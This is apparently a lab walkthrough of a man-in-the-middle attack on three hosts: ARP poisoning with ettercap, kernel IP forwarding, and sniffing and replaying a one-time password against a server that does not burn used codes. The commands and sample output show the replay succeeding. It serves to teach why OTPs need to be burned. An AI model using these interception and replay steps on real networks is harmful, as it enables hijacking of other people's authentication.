**NOTE:** _This assumes the setup instructions have been completed_

First, we start up the server on host 3:
```root@host3:~# ROCKET_ADDRESS=0.0.0.0 OTP_DO_NOT_BURN=1 ./server```

Then on the second host, we setup the man in the middle attack.
First we have to poison the arp tables of hosts 1 and 3 so that all the traffic gets routed to host 2.
```root@host2:~# ./spoof.sh```
This should generate output looking like this 
```

This uses `ettercap` to execute the poisoning attack. Due to a bug in `ettercap` however, it is unable to correctly forward TCP packets. To deal with this, we kill `ettercap` and then enable ip forwarding at the kernel level. Now that we have executed the poisoning attack, we are ready to sniff out the OTP code. Let's prepare the attack!
```root@host2:~# OTP_REPLAY_MODE=immediate ./attack```
The binary should indicate that it is listening for packets 

```
Starting capture...
Capture initialized.
Setting tcp filter...

```

Now that we are sniffing traffic in our MiTM, let's run the client from the first host!

```root@host1:~# ./client 10.4.9.3```


Back on host two, we should see something like this.
```
Starting capture...
Capture initialized.
Setting tcp filter...
Listening...
Captured OTP: "3c7e515d1a05961441ef3f04db534db1"
Executing immediate replay attack
SUCESSS: Replay attack worked!
```

Also notice that on host 3, the server has received two authentication requests! 

```

    => Matched: POST /auth (auth)

```
One of these came from the legitimate client and the other came from our attacker. Note that we cannot actually know what the code is from the attacker as it is encrypted, but that doesn't matter! We can just replay the same bytes because the server doesn't burn the code. Now if the server burned codes, this attack would not work.
